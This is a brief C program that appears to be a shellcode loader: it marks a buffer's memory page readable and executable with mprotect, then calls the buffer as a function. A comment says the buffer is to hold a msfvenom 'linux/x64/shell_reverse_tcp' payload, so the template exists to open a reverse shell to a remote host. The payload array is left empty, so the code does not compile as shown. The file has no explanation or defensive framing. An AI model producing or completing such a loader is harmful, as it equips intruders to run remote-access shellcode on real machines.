#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect 
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//'linux/x64/shell_reverse_tcp' payload, use msfvenom
unsigned char buf[] = ;

int main (int argc, char **argv) 
{
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                pagesize, PROT_READ|PROT_EXEC))
        {
                perror("mprotect");
                return -1;
        }
        	
	int (*ret)() = (int(*)())buf;
  	ret();
  
        return 0;
}
